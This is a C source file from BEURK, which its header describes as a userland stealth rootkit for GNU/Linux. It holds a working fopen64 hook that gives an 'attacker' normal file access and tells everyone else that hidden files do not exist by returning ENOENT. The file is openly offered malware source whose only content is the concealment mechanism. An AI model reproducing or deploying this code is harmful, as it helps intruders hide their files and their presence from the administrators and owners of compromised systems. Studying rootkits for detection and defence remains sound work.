/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h> /* errno, ENOENT */
#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
#include "config.h" /* REAL_FOPEN() */
#include "hooks.h" /* prototype, FILE */

// TODO: is_procnet()

FILE *fopen64(const char *__restrict path, const char *mode) {
    DEBUG(D_INFO, "called fopen(3) hook");

    if (is_attacker())
        return (REAL_FOPEN64(path, mode));

    if (is_hidden_file(path)) {
        errno = ENOENT;
        return NULL;
    }

    return (REAL_FOPEN64(path, mode));
}
